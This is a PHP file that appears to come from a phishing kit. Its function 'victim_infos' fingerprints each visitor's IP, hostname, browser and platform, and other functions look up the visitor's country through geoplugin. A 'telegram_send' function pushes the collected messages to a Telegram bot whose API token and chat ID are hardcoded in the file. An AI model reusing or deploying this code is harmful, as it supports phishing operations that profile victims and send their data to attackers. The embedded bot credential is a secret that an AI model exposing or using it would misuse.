<?php
include('detect.php');
    function get_client_ip() {
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        if(filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }
        if( $ip == '::1' ) {
            return '127.0.0.1';
        }
        return  $ip;
    }
    function victim_infos() {
        $detect         = new BrowserDetection();
        $ip             = get_client_ip();
        $browserName    = $detect->getName();
        $browserVer     = $detect->getVersion();
        $isMobile       = ($detect->isMobile()) ? 'true' : 'false';
        $platformName   = $detect->getPlatformVersion();
        $hostname       = gethostbyaddr(get_client_ip());
        $message        = "IPA    : $ip | $hostname" . "\r\n";
        $message        .= "Agent : $browserName | $browserVer | Mobile : $isMobile  |  $platformName"  . "\r\n\r\n";
        return $message;
    }
    
    function get_client_country() {
        $details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=". get_client_ip() .""));
        if ($details && $details->geoplugin_countryName != null) {
            $countryname = $details->geoplugin_countryName;
        }
        return $countryname;
    }
    function get_client_countrycode() {
        $details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" .  get_client_ip() . ""));
        if ($details && $details->geoplugin_countryCode != null) {
            $countrycode = $details->geoplugin_countryCode;
        }
        return $countrycode;
    }
    function telegram_send($message) {
    $curl = curl_init();
    $api_key  = '5346795287:AAH4E_RDJyKyO6EXqsfhfCKzy_kCkAEHK30';
    $chat_id  = '-4027379174';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}
    function visitors() {
        $detect         = new BrowserDetection();
        $ip             = get_client_ip();
        $date           = date("Y-m-d H:i:s", time());
        $usragent       = $_SERVER['HTTP_USER_AGENT'];
        $browserName    = $detect->getName();
        $browserVer     = $detect->getVersion();
        $isMobile       = ($detect->isMobile()) ? 'Mobile' : 'Not mobile';
        $platformName   = $detect->getPlatform();
        //$country        = get_client_country();
    }

?>